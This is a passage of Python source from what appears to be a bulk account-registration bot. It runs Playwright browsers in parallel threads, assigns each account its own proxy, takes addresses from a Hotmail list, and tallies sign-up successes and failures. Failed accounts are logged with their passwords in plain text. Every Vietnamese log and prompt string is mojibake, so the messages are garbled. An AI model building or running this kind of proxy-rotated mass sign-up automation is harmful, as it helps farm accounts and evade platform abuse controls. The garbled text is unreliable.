        logging.error("D·ª´ng ch∆∞∆°ng tr√¨nh do key kh√¥ng h·ª£p l·ªá.")
        input("Nh·∫•n Enter ƒë·ªÉ tho√°t...")
        sys.exit(1)
    
    # Ensure browsers are installed (especially important for bundled executables)
    logging.info("ƒêang ki·ªÉm tra v√† chu·∫©n b·ªã browsers...")
    if not ensure_browsers_installed():
        logging.error("‚ùå Kh√¥ng th·ªÉ c√†i ƒë·∫∑t ho·∫∑c t√¨m th·∫•y Playwright browsers.")
        logging.error("=" * 60)
        logging.error("üìù H∆Ø·ªöNG D·∫™N KH·∫ÆC PH·ª§C:")
        logging.error("1. T·∫°o th∆∞ m·ª•c 'playwright_browsers' c√πng v·ªõi file .exe")
        logging.error("2. T·∫£i Chromium v√† gi·∫£i n√©n v√†o th∆∞ m·ª•c ƒë√≥:")
        logging.error("   https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html")
        logging.error("3. Ho·∫∑c copy t·ª´ m√°y ƒë√£ c√†i Playwright:")
        logging.error("   %USERPROFILE%\\AppData\\Local\\ms-playwright")
        logging.error("4. C·∫•u tr√∫c th∆∞ m·ª•c ph·∫£i nh∆∞ sau:")
        logging.error("   playwright_browsers/chromium-xxxx/chrome-win/chrome.exe")
        logging.error("=" * 60)
        logging.error("Ho·∫∑c ƒë·ªçc file BUILD_GUIDE.md ƒë·ªÉ bi·∫øt th√™m chi ti·∫øt")
        input("Nh·∫•n Enter ƒë·ªÉ tho√°t...")
        sys.exit(1)
    
    try:
        # Load input files
        accounts, proxies, hotmails = load_input_files()
        
        # Clean previous user data
        clean_all_user_data()
        
        # Get number of threads
        try:
            num_threads = int(input("Nh·∫≠p s·ªë lu·ªìng ƒë·ªÉ ch·∫°y: "))
            if num_threads <= 0:
                logging.warning("S·ªë lu·ªìng ph·∫£i l√† s·ªë d∆∞∆°ng. ƒê·∫∑t m·∫∑c ƒë·ªãnh l√† 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"S·ªë lu·ªìng ({num_threads}) v∆∞·ª£t qu√° s·ªë t√†i kho·∫£n ({len(accounts)}). ƒê·∫∑t th√†nh {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("ƒê·∫ßu v√†o s·ªë lu·ªìng kh√¥ng h·ª£p l·ªá. ƒê·∫∑t m·∫∑c ƒë·ªãnh l√† 1.")
            num_threads = 1
        
        # Nh·∫≠p l·ª±a ch·ªçn hi·ªÉn th·ªã tr√¨nh duy·ªát
        show = input("B·∫°n c√≥ mu·ªën hi·ªÉn th·ªã c·ª≠a s·ªï tr√¨nh duy·ªát kh√¥ng? (y/n): ").strip().lower()
        show_browser = show in ['y', 'yes']
                
        # Setup account queue
        account_queue = Queue()
        screen_width, screen_height = pyautogui.size()
        col = 4  # Number of columns for browser windows
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        browser_init_lock = threading.Lock()
        
        def worker():
            """H√†m worker thread"""
            browser = None
            while not account_queue.empty():
                try:
                    account, account_index = account_queue.get()
                    with browser_init_lock:
                        proxy = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                        size = (screen_width // col, 400)
                        
                        # Debug logging for proxy
                        if proxy:
                            logging.debug(f"Using proxy for {account['email']}: {proxy}")
                            # # Test proxy connection
                            # if proxy.get('username') and proxy.get('password'):
                            #     if not test_proxy_connection(proxy):
                            #         logging.warning(f"Proxy test failed for {proxy['full']}, trying without proxy...")
                            #         proxy = None  # Fallback to no proxy
                        
                        # Try to initialize browser with proxy, fallback to no proxy if it fails
                        browser_initialized = False
                        for use_proxy in [True, False]:
                            if not use_proxy and proxy is None:
                                continue  # Skip if we already tried without proxy
                                
                            current_proxy = proxy if use_proxy else None
                            try:
                                browser, context, page, user_data_dir, playwright = init_browser(
                                    proxy=current_proxy, 
                                    email=account['email'],  
                                    size=size
                                )
                                browsers.append(browser)
                                browser_initialized = True
                                if not use_proxy:
                                    logging.warning(f"Fallback to no proxy for {account['email']}")
                                break
                            except Exception as e:
                                logging.warning(f"Failed to initialize browser with{'out' if not use_proxy else ''} proxy for {account['email']}: {repr(e)}")
                                if browser:
                                    try:
                                        browser.close()
                                    except:
                                        pass
                                    browser = None
                                
                        if not browser_initialized:
                            raise Exception("Failed to initialize browser with and without proxy")
                    
                    process_account(browser, context, page, user_data_dir, playwright, account, account_index, hotmails)

                except Exception as e:
                    logging.error(f"L·ªói trong worker thread: {repr(e)}")
                    # Log the account as failed
                    with file_lock:
                        failed_accounts.append({'account': account, 'error': repr(e)})
                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                
                finally:
                    if browser and browser in browsers:
                        browsers.remove(browser)
                    account_queue.task_done()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, name=f"Lu·ªìng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # B√°o c√°o cu·ªëi c√πng v√† d·ªçn d·∫πp
        logging.info("ƒê√£ x·ª≠ l√Ω xong t·∫•t c·∫£ t√†i kho·∫£n.")
        logging.info(f"‚úÖ ƒêƒÉng k√Ω th√†nh c√¥ng: {len(successful_accounts)}")
        logging.info(f"‚ùå ƒêƒÉng k√Ω th·∫•t b·∫°i: {len(failed_accounts)}")
        
        clean_all_user_data()
        logging.info("Ch∆∞∆°ng tr√¨nh ho√†n t·∫•t. Tho√°t sau 5 gi√¢y...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"L·ªói trong h√†m main: {repr(e)}")
    finally:
        cleanup_browsers()
        if len(hotmail_need_deletes) > 0:
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() not in hotmail_need_deletes:
                                        f.write(line)
                                else:
                                    f.write(line)
                        # logging.debug(f"üóëÔ∏è ƒê√£ x√≥a {hotmail} kh·ªèi hotmail.txt")
                except Exception as e:
                    pass


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, cleanup_browsers)
        signal.signal(signal.SIGINT, cleanup_browsers)
        atexit.register(cleanup_browsers)
        main()
    except KeyboardInterrupt:
        logging.info("Nh·∫≠n KeyboardInterrupt. ƒêang d·ªçn d·∫πp...")
        cleanup_browsers()
        clean_all_user_data()
        logging.info("D·ªçn d·∫πp ho√†n t·∫•t. Tho√°t...")
        sys.exit(0)
